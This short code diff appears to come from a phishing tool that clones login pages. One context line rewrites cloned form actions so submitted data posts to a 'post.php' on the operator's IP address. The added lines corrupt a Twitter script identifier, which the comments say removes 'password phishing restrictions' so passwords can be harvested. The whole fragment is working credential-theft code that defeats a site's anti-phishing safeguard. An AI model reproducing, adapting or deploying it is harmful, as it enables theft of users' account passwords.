@@ -81,6 +81,11 @@ for line in fileopen:
                 line = re.sub('action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
 
 
+    # this is if twitter is in use, we rename a function name to something garbage to remove password phishing restrictions
+    match2 = re.search("swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
+    if match2:
+        # garble the buckets name, causes password to not be jacked
+        line = line.replace("swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")
 
     filewrite.write(line)
 
